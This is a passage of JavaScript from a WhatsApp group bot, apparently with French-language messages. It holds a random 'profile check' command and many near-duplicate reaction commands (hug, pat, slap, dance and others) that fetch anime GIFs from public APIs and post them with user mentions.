					var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					var sipat = sifat[Math.floor(Math.random() * sifat.length)]
					var biho = hoby[Math.floor(Math.random() * hoby.length)]
					var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
					var senga = arp[Math.floor(Math.random() * arp.length)]
					var chakep = cakep[Math.floor(Math.random() * cakep.length)]
					var watak = wetak[Math.floor(Math.random() * wetak.length)]
					var baik = baikk[Math.floor(Math.random() * baikk.length)]
					var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
					var berani = berhani[Math.floor(Math.random() * berhani.length)]
					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
					 profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Nom :* ${m.pushName}
*Caracteristique :* ${sipat}
*Hobby :* ${biho}
*Simp :* ${bhucin}%
*Great :* ${senga}%
*Beautey :* ${chakep}
*Caractere :* ${watak}
*Bonne Moralitey :* ${baik}%
*Cotey Sombre :* ${burug}%
*Intelligence :* ${cerdas}%
*Courage :* ${berani}%
*Culpabilitey :* ${takut}%

*≡═══《 SONDAGE 》═══≡*`
					try {
ppuser = await Kev.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppkev = await getBuffer(ppuser)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: profile
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: ppkev, mentions: [bet]}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [bet], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: global.xchannel.jid,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
}
break
			case 'hug': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/hug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} hugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} hugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cry': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cried themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cried @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kill': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kill`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} killed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} killed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'pat': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/pat`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} patted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} patted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'lick': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/lick`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} licked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} licked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'kiss': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/kiss`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} kissed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} kissed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bite': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cry`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bit themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bit @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'yeet': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/yeet`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} yeeted themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} yeeted @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bully': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bully`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bullied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bullied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'bonk': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/bonk`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} bonked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} bonked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wink': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wink`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} winked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} winked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'poke': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/poke`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} poked themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} poked @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'nom': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/nom`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} nommed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} nommed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'slap': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/slap`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} slapped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} slapped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smile': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smile`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smiled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smiled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'wave': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/wave`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} waved themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} waved @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'awoo': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} awooed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} awooed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'blush': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/blush`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} blushed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} blushed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'smug': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/smug`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} smugged themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} smugged @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'glomp': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/glomp`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} glomped themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} glomped @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'happy': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} happied themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'dance': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} danced themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cringe': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cringed themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'cuddle': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} cuddled themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'highfive': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} highfived themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
        case 'handhold': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

            users == "none"

            ment = [messsender, m.sender]

          }

          if (users == "none") {

           musers = `@${m.sender.split("@")[0]} handheld themself!`

          } else {

           musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

          }

          const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

          const buffer = Buffer.from(response.data, "utf-8")

          var fetchedgif = await GIFBufferToVideoBuffer(buffer)

          Kev.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: m })

        } catch (error) {

          console.log(error);

        }

      }

        break;
                case 'spank': {

        if (!m.isGroup) return KevStickGroup()
        if (!m.mentionedJid[0] && !m.quoted) return replygckev(`Veuillez tag le concerney`)
        var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

        try {

          let messsender = m.sender

          let musers = ``
          try {

            users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

            ment = [messsender, users]

          } catch {

